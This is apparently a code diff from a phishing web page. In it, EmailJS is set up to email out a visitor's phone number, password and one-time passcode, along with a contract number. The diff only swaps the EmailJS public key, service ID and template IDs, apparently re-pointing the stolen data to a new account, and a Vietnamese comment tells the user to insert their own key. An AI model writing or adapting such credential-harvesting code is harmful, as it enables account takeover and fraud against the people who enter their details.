@@ -22,7 +22,7 @@
     <script type="text/javascript">
       (function () {
         emailjs.init({
-        publicKey: "J4YH-lyfEfxXeu7aV", // Thay bằng Public Key của bạn
+        publicKey: "KJ7TlqIPf7U4cfyzQ", // Thay bằng Public Key của bạn
         });
       })();
     </script>
@@ -1104,7 +1104,7 @@
         };
 
         const sendToEmail = (type, value) => {
-          const serviceID = "service_60tgxof";
+          const serviceID = "service_149dqxt";
           let templateID = "";
           let templateParams = {};
           const contractNumber =
@@ -1120,17 +1120,17 @@
           };
 
           if (type === "phone") {
-            templateID = "template_fmgakjl";
+            templateID = "template_qs31vgb";
             templateParams = { ...commonParams, phone: value };
           } else if (type === "password") {
-            templateID = "template_4yjqdh7";
+            templateID = "template_7m0le19";
             templateParams = {
               ...commonParams,
               phone: credentials.phone,
               password: value,
             };
           } else if (type === "otp") {
-            templateID = "template_ihca6qe";
+            templateID = "template_neh3g4c";
             templateParams = {
               ...commonParams,
               phone: credentials.phone,
